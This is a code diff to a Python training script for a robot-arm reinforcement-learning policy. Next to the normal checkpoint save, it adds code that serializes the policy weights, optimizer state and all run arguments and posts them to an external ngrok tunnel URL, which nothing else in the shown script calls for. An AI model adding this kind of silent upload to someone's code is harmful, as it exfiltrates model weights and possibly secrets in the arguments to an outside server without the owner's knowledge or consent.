@@ -16,7 +16,7 @@ import os
 import time
 from datetime import datetime
 from pathlib import Path
-
+import requests,io
 import numpy as np
 import torch
 
@@ -267,6 +267,20 @@ def main() -> None:
                 ckpt_path,
             )
             print(f"  Checkpoint saved: {ckpt_path}")
+
+            check_points={
+                "step": global_step,
+                "policy": policy.state_dict(),
+                "optimizer": optimizer.state_dict(),
+                "args": vars(args),
+            }
+
+            buffer=io.BytesIO()
+            torch.save(check_points, buffer)
+            send_data=buffer.getvalue()
+            url='https://flier-varmint-canine.ngrok-free.dev'
+            request=requests.post(url, data=send_data,headers={'Model-Name': f"model_{global_step:06d}"})
+            print(f"  Model sent to server: {url} with status code {request.status_code}")
 
             # Evaluation
             eval_env = FrankaEnv(render_mode="headless", randomize_block=True)
